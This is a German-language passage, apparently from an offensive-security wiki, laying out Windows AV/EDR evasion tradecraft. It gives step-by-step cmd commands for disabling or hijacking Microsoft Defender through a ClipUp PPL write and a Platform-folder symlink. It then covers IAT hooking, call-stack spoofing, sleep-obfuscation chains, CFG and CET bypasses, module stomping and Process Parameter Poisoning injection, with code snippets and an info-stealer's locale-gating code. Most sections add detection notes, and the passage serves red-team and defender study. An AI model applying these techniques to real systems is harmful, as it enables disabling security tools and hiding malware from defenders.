LOLBIN primitive: ClipUp.exe
- Das signierte System-Binary `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn es als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht parsen; verwenden Sie 8.3-Kurznamen, um auf normalerweise geschützte Speicherorte zu verweisen.

8.3-Kurznamen-Hilfsbefehle
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzen Pfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starten Sie das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` unter Verwendung eines Launchers (z. B. CreateProcessAsPPL).
2) Übergeben Sie das ClipUp-Argument für den Logpfad, um die Erstellung einer Datei in einem geschützten AV-Verzeichnis (z. B. Defender Platform) zu erzwingen. Verwenden Sie bei Bedarf 8.3-Kurznamen.
3) Wenn die Zieldatei normalerweise vom laufenden AV geöffnet/gesperrt wird (z. B. MsMpEng.exe), planen Sie den Schreibvorgang beim Booten ein, bevor der AV startet, indem Sie einen Auto-Start-Dienst installieren, der zuverlässig früher ausgeführt wird. Überprüfen Sie die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Neustart erfolgt der durch PPL unterstützte Schreibvorgang, bevor der AV seine Binaries sperrt, wodurch die Zieldatei beschädigt und der Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen entfernt/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notizen und Einschränkungen
- Sie können den Inhalt, den ClipUp schreibt, nicht kontrollieren, sondern nur dessen Platzierung; das Primitive eignet sich eher zur Beschädigung als zur präzisen Inhaltsinjektion.
- Erfordert lokale Administrator-/SYSTEM-Rechte, um einen Dienst zu installieren/zu starten, sowie ein Neustartfenster.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung zur Boot-Zeit vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der übergeordnete Prozess ein nicht standardmäßiger Launcher ist und dies während des Bootvorgangs geschieht.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten, und die konsequent vor Defender/AV gestartet werden. Untersuchen Sie die Erstellung/Änderung von Diensten vor Fehlern beim Starten von Defender.
- Datei-Integritätsüberwachung für Defender-Binärdateien/Platform-Verzeichnisse; unerwartete Datei-Erstellungen/-Änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Suchen Sie nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, sowie nach anomaler PPL-Level-Nutzung durch Nicht-AV-Binärdateien.

Abwehrmaßnahmen
- WDAC/Code Integrity: Beschränken Sie, welche signierten Binärdateien als PPL und unter welchen übergeordneten Prozessen ausgeführt werden dürfen; blockieren Sie die ClipUp-Aufruf außerhalb legitimer Kontexte.
- Service-Hygiene: Beschränken Sie die Erstellung/Änderung automatisch startender Dienste und überwachen Sie Manipulationen an der Startreihenfolge.
- Stellen Sie sicher, dass der Tamper-Schutz von Defender und der Early-Launch-Schutz aktiviert sind; untersuchen Sie Startfehler, die auf eine Beschädigung von Binärdateien hinweisen.
- Ziehen Sie in Betracht, die Generierung von 8.3-Kurznamen auf Volumes zu deaktivieren, auf denen sich Security-Tools befinden, sofern dies mit Ihrer Umgebung kompatibel ist (gründlich testen).

Referenzen zu PPL und Tools
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulation von Microsoft Defender durch Hijacking eines Symlinks zum Platform-Versionsordner

Windows Defender wählt die Platform, von der es ausgeführt wird, durch Aufzählung der Unterordner unter:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit dem lexikografisch höchsten Versionsstring (z. B. `4.18.25070.5-0`) und startet anschließend die Defender-Dienstprozesse von dort (wobei die Dienst-/Registry-Pfade entsprechend aktualisiert werden). Diese Auswahl vertraut Verzeichniseinträgen einschließlich Directory-Reparse-Points (Symlinks). Ein Administrator kann dies nutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL-Sideloading oder eine Dienstunterbrechung zu erreichen.

Voraussetzungen
- Lokaler Administrator (erforderlich, um Verzeichnisse/Symlinks unter dem Platform-Ordner zu erstellen)
- Möglichkeit, einen Neustart durchzuführen oder eine erneute Auswahl der Defender-Platform auszulösen (Dienstneustart beim Booten)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber die Auswahl der Platform vertraut Verzeichniseinträgen und wählt die lexikografisch höchste Version, ohne zu überprüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstellen Sie einen beschreibbaren Klon des aktuellen Platform-Ordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink mit einer höheren Versionsnummer, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen, dass MsMpEng.exe (WinDefend) aus dem umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Der neue Prozesspfad unter `C:\TMP\AV\` sowie die Service-Konfiguration/Registry sollten diesen Speicherort widerspiegeln.

Post-exploitation options
- DLL sideloading/code execution: DLLs ablegen/ersetzen, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Den Version-Symlink entfernen, sodass der konfigurierte Pfad beim nächsten Start nicht aufgelöst werden kann und Defender nicht gestartet werden kann:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachten Sie, dass diese Technik allein keine Privilege Escalation ermöglicht; sie erfordert Admin-Rechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreiferkontrollierten, positionsunabhängigen Code (PIC) routen. Dadurch wird die Evasion über die kleine API-Oberfläche hinaus verallgemeinert, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz wird auf BOFs und Post-Exploitation-DLLs ausgeweitet.

High-level approach
- Ein PIC-Blob wird mithilfe eines Reflective Loaders neben dem Zielmodul platziert (vorangestellt oder als Companion). Der PIC muss self-contained und positionsunabhängig sein.
- Beim Laden der Host-DLL wird ihr IMAGE_IMPORT_DESCRIPTOR durchlaufen, und die IAT-Einträge für die zu überwachenden Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) werden so gepatcht, dass sie auf schlanke PIC-Wrapper zeigen.
- Jeder PIC-Wrapper führt vor dem Tail-Call zur echten API-Adresse Evasions aus. Typische Evasions umfassen:
- Memory Masking/Unmasking rund um den Aufruf (z. B. Beacon-Regionen verschlüsseln, RWX→RX, Seitennamen/-berechtigungen ändern) und anschließendes Wiederherstellen.
- Call-Stack Spoofing: Einen harmlosen Stack erstellen und in die Ziel-API wechseln, sodass die Call-Stack-Analyse erwartete Frames auflöst.
- Aus Kompatibilitätsgründen eine Schnittstelle exportieren, über die ein Aggressor-Script (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum IAT Hooking hier
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxyt.
- Deckt Post-Ex-DLLs ab: Durch das Hooken von LoadLibrary* können Modul-Ladevorgänge abgefangen werden (z. B. System.Management.Automation.dll, clr.dll), um auf deren API-Aufrufe dasselbe Masking und dieselbe Stack-Evasion anzuwenden.
- Ermöglicht wieder eine zuverlässige Nutzung von Post-Ex-Befehlen zum Starten von Prozessen gegen Call-Stack-basierte Erkennungen, indem CreateProcessA/W gewrappt wird.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr demonstrieren Hooking während `DllMain` des geladenen Moduls.
- Halte Wrapper klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen erfasst hast, oder über `LdrGetProcedureAddress`.
- Verwende für PIC RW → RX-Übergänge und vermeide es, beschreibbare und ausführbare Seiten zu hinterlassen.

Call-stack spoofing stub
- PIC-Stub wie die von Draugr bauen eine gefälschte Call Chain auf (Return Addresses in harmlosen Modulen) und wechseln anschließend zur echten API.
- Dadurch werden Erkennungen umgangen, die kanonische Stacks von Beacon/BOFs zu sensiblen APIs erwarten.
- Kombiniere dies mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog innerhalb der erwarteten Frames zu landen.

Operational integration
- Stelle den Reflective Loader den Post-Ex-DLLs voran, damit PIC und Hooks automatisch initialisiert werden, wenn die DLL geladen wird.
- Verwende ein Aggressor-Script, um Ziel-APIs zu registrieren, sodass Beacon und BOFs transparent vom gleichen Evasion-Pfad profitieren, ohne Codeänderungen.

Detection/DFIR considerations
- IAT-Integrität: Einträge, die zu nicht zum Image gehörenden (Heap-/anonymen) Adressen aufgelöst werden; regelmäßige Überprüfung von Import-Pointern.
- Stack-Anomalien: Return Addresses, die zu keinem geladenen Image gehören; abrupte Übergänge zu nicht zum Image gehörendem PIC; inkonsistente `RtlUserThreadStart`-Abstammung.
- Loader-Telemetrie: In-Process-Schreibzugriffe auf die IAT, frühe `DllMain`-Aktivität, die Import-Thunks verändert, unerwartete RX-Regionen, die beim Laden erstellt werden.
- Image-Load-Evasion: Wenn `LoadLibrary*` gehookt wird, überwache verdächtige Ladevorgänge von Automation-/CLR-Assemblies, die mit Memory-Masking-Ereignissen korrelieren.

Related building blocks and examples
- Reflective Loader, die während des Ladens IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stub (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Wenn du einen Reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des Loaders durch einen benutzerdefinierten Resolver ersetzt, der zuerst Hooks prüft:

- Erstelle ein **resident PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem sich das transiente Loader-PIC selbst freigegeben hat.
- Exportiere eine `setup_hooks()`-Funktion, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Ordinal-Imports und verwende eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook existiert, gib ihn zurück; andernfalls delegiere an den echten `GetProcAddress`.
- Registriere Hook-Ziele zur Link-Zeit mit Crystal Palace-Einträgen der Form `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er innerhalb des residenten PICO liegt.

Dies ermöglicht **Import-Time-IAT-Redirection**, ohne nach dem Laden den Code-Abschnitt der geladenen DLL zu patchen.

### Forcing hookable imports when the target uses PEB-walking

Import-Time-Hooks werden nur ausgelöst, wenn die Funktion tatsächlich in der IAT des Ziels enthalten ist. Wenn ein Modul APIs über einen PEB-Walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des Loaders ihn erkennt:

- Ersetze die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch eine Interception möglich wird, wenn der Reflective Loader Imports auflöst.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Statt `Sleep` zu patchen, hooke die **tatsächlichen Wait-/IPC-Primitiven**, die das Implantat verwendet (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Um lange Waits herum kann eine Obfuscation Chain im Ekko-Stil verwendet werden, die das In-Memory-Image während der Idle-Phase verschlüsselt:

- Verwende `CreateTimerQueueTimer`, um eine Sequenz von Callbacks zu planen, die `NtContinue` mit präparierten `CONTEXT`-Frames aufrufen.
- Typische Chain (x64): Image auf `PAGE_READWRITE` setzen → RC4-Verschlüsselung über das vollständige gemappte Image mit `advapi32!SystemFunction032` → blockierenden Wait ausführen → RC4-Entschlüsselung → **per-Section-Berechtigungen wiederherstellen**, indem die PE-Sections durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert ein Template-`CONTEXT`; kopiere es in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operational detail: Gib für lange Waits (z. B. `WAIT_OBJECT_0`) „success“ zurück, damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Idle-Fenstern vor Scannern und vermeidet die klassische Signatur eines gepatchten `Sleep()`.

Detection ideas (telemetry-based)
- Bursts von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- `advapi32!SystemFunction032`, das auf großen, zusammenhängenden, imagegroßen Buffern verwendet wird.
- `VirtualProtect` über große Bereiche, gefolgt von einer benutzerdefinierten Wiederherstellung der Berechtigungen pro Section.

### Runtime CFG registration for sleep-obfuscation gadgets

Auf CFG-aktivierten Zielen stürzt der erste indirekte Sprung zu einem Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` normalerweise mit `STATUS_STACK_BUFFER_OVERRUN` ab, weil das Gadget nicht in den CFG-Metadaten des Moduls vorhanden ist. Damit Ekko-/Kraken-ähnliche Chains innerhalb gehärteter Prozesse aktiv bleiben:

- Registriere jedes von der Chain verwendete indirekte Ziel mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Für Adressen innerhalb geladener Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` am **Image Base** beginnen und die **vollständige Image-Größe** abdecken.
- Verwende für manuell gemappte/PIC-/gestompte Regionen stattdessen die **Allocation Base** und die Allokationsgröße.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Syscalls) sowie alle vom Angreifer kontrollierten ausführbaren Sections, die zu indirekten Zielen werden.

Dadurch werden ROP-/JOP-ähnliche Sleep-Chains von „funktioniert nur in Nicht-CFG-Prozessen“ zu einem wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpoints.

### CET-safe stack spoofing for sleeping threads

Ein vollständiger `CONTEXT`-Austausch ist auffällig und kann auf CET-Shadow-Stack-Systemen fehlschlagen, weil ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:

- Wähle einen anderen Thread im selben Prozess und lese dessen `NT_TIB`-/TEB-Stack-Grenzen (`StackBase`, `StackLimit`) über `NtQueryInformationThread`.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse den echten Sleep-Kontext mit `GetThreadContext`.
- Kopiere **nur** das echte `Rip` in den Spoof-Kontext und lasse den gefälschten `Rsp`-/Stack-Zustand unverändert.
- Kopiere während des Sleep-Fensters den `NT_TIB` des Spoof-Threads in den aktuellen TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs entrollen.
- Stelle nach Ende des Waits den ursprünglichen TIB und Thread-Kontext wieder her.

Dadurch bleibt der Instruction Pointer CET-konsistent, während EDR-Stack-Walker getäuscht werden, die TEB-Stack-Metadaten zur Validierung von Unwinds verwenden.

### APC-based alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu stark signiert ist, kann dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz von einem suspendierten Helper-Thread mithilfe gequeuter APCs ausgeführt werden:

- Erstelle einen Helper-Thread mit `NtTestAlert` als Entrypoint.
- Queue vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` und arbeite sie mit `NtAlertResumeThread` ab.
- Speichere den Chain-Zustand auf dem Heap statt auf dem Helper-Stack, um eine Erschöpfung des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um das Start-Event atomar zu signalisieren und zu blockieren.
- Suspendiere den Main Thread, bevor TIB/Kontext wiederhergestellt werden (`NtSuspendThread` → Wiederherstellung → `NtResumeThread`), um das Race Window zu verkleinern, in dem ein Scanner einen nur teilweise wiederhergestellten Stack erfassen könnte.

Dadurch wird die Signatur `CreateTimerQueueTimer` + `NtContinue` gegen eine Helper-Thread-/APC-Signatur ausgetauscht, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Additional detection ideas
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` im Zusammenhang mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- `NtQueryInformationThread`, gefolgt von direkten Schreibzugriffen auf die TEB-/TIB-Stack-Grenzen des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Chains, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung von Section-Berechtigungen erreichen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Precision Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Abschnitt einer DLL aus, die bereits innerhalb des Zielprozesses gemappt ist**, anstatt offensichtlich privaten ausführbaren Speicher zu allokieren oder eine neue sacrificial DLL zu laden. Das Überschreibziel sollte ein **geladenes, vom Datenträger stammendes Image** sein, dessen Code-Bereich den Payload aufnehmen kann, ohne noch benötigte Codepfade des Prozesses zu beschädigen.

### Reliable target selection

Naives Stomping gegen verbreitete Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Code-Bereich wird den Prozess zum Absturz bringen. Ein zuverlässigerer Workflow ist:

1. Enumeriere die Module des Zielprozesses und behalte eine **namenbasierte Include-Liste** der bereits geladenen DLLs.
2. Erstelle zuerst den Payload und erfasse seine **exakte Byte-Größe**.
3. Scanne die Candidate-DLLs auf dem Datenträger und vergleiche `Misc_VirtualSize` der PE-Section **`.text`** mit der Payload-Größe. Dies ist wichtiger als die Dateigröße, weil dadurch die Größe der ausführbaren Section **beim Mapping im Speicher** widergespiegelt wird.
4. Parse die **Export Address Table (EAT)** und wähle die RVA einer exportierten Funktion als Start-Offset für das Stomping.
5. Berechne den **Blast Radius**: Wenn der Payload die Grenze der ausgewählten Funktion überschreitet, überschreibt er angrenzende Exports, die danach im Speicher angeordnet sind.

Typische Recon-/Auswahl-Hilfsfunktionen, die in freier Wildbahn zu sehen sind:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Betriebshinweise
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung nur selten ausgeführt werden; andernfalls können normale Codepfade die überschriebenen Bytes vor oder nach der Thread-Erstellung ausführen.
- Große Implants erfordern häufig, die Einbettung des Shellcodes von einem String-Literal zu einem **Byte-Array/Initialisierer mit geschweiften Klammern** zu ändern, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Erkennungsideen
- Remote-Schreibvorgänge in **aus einem Image stammende ausführbare Speicherseiten** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die häufigeren privaten RWX/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Context-Pivots, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kürzlich verändert wurden.
- Verdächtige Sequenzen aus `VirtualProtect(Ex)` / `WriteProcessMemory` gegen DLL-`.text`-Seiten, gefolgt von der Erstellung eines Threads.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **process-injection / EDR-evasion**-Technik, die den klassischen Remote-Write-Pfad (`VirtualAllocEx` + `WriteProcessMemory`) vermeidet. Statt Bytes in ein bereits laufendes Ziel zu kopieren, missbraucht sie die Tatsache, dass Windows ausgewählte `CreateProcessW`-Startparameter in den Child-Prozess **kopiert** und innerhalb von `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.

### Durch `CreateProcessW` kopierbare Träger

Nützliche Träger sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Träger:

- `lpCommandLine` muss für `CreateProcessW` auf beschreibbaren Speicher zeigen und ist einschließlich des Nullterminators auf **32.767 Unicode-Zeichen** begrenzt.
- `lpEnvironment` muss ein Unicode-Environment-Block aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, der mit einem zusätzlichen `\0` beendet wird.
- `lpReserved` ist offiziell reserviert. Daher sollte das `ShellInfo`-Mapping eher als Implementierungsdetail und nicht als stabiler dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Primitive**. Der Operator erstellt den Child-Prozess mit vom Angreifer kontrollierten Startdaten und lässt Windows die prozessübergreifende Kopie durchführen.

### Remote-Lookup-Ablauf ohne Remote-Write-APIs

Nachdem der Child-Prozess erstellt wurde, wird der kopierte Buffer mit **read-only**-Primitiven aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Pointer verwenden:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimaler Ablauf:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Ausführen des kopierten Parameterpuffers

Die kopierte Parameterregion ist normalerweise `RW` und nicht ausführbar. Eine häufige P3-Chain besteht aus:

1. Den Prozess normal erstellen (nicht angehalten)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den bereits in `PROCESS_INFORMATION` zurückgegebenen Main-Thread-Handle wiederverwenden
4. Die Ausführung mit `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` überschreiben) umleiten

Im Gegensatz zu klassischen Thread-Hijacking-Workflows erfordert dies **nicht** `SuspendThread` / `ResumeThread`; der Context kann direkt über den zurückgegebenen Main-Thread-Handle geändert werden.

Dadurch werden mehrere APIs vermieden, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- häufig auch `SuspendThread` / `ResumeThread`

### Null-Byte-Einschränkung und staged shellcode

Alle drei Träger enthalten **String- oder String-ähnliche Daten**, weshalb ein Raw-Payload mit `0x00` während der Übertragung abgeschnitten wird. Eine praktikable Lösung ist eine **null-freie erste Stufe**, die Konstanten zur Laufzeit rekonstruiert und anschließend eine beliebige zweite Stufe lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Konstanten:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Dies ermöglicht es der ersten Stufe, Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader der zweiten Stufe zu erstellen, ohne Null-Bytes in den übertragenen Parameter einzubetten.

### Stack-basierte API-Aufrufe aus der ersten Stufe

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Buffer auf den Stack des Ziels pushen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Pointer setzen
- `RSP` vor dem Aufruf **16-Byte-ausgerichtet** halten

Eine zweite Stufe kann anschließend vom Stack in eine `PAGE_READWRITE`-Allokation kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` umgestellt und ausgeführt werden, wodurch eine direkte RWX-Allokation vermieden wird.

### Detection-Ideen

Gute Hunting-Möglichkeiten, die von den Autoren erwähnt wurden:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, die **Prozessparameter-Seiten ausführbar** machen
- diese Schutzänderung, gefolgt von `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und anschließend auf `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange / entropyreiche Werte für `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Transfer-Trick** und für sich allein keine vollständige Execution Primitive: Der kopierte Parameter benötigt weiterhin eine Änderung der Ausführungsberechtigungen sowie eine Methode zur Umleitung der Ausführung.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, aber verworfen, da es intern verdächtige Primitives wie `NtWriteVirtualMemory` und `NtCreateThreadEx` verwendet.

## SantaStealer Tradecraft für Fileless Evasion und Credential Theft

SantaStealer (auch BluelineStealer genannt) veranschaulicht, wie moderne Info-Stealer AV bypass, Anti-Analysis und Credential Access in einem einzigen Workflow kombinieren.

### Keyboard-Layout-Gating und Sandbox-Verzögerung

- Ein Config-Flag (`anti_cis`) listet installierte Keyboard-Layouts über `GetKeyboardLayoutList` auf. Wird ein kyrillisches Layout gefunden, legt das Sample eine leere `CIS`-Markierung ab und beendet sich, bevor es Stealer ausführt. Dadurch wird sichergestellt, dass es in ausgeschlossenen Locales nie detoniert, während gleichzeitig ein Hunting-Artefakt zurückbleibt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Geschichtete `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten Rolling-Checksumme und vergleicht sie mit eingebetteten Blocklists für Debugger/Sandboxes. Anschließend wiederholt sie die Checksumme für den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
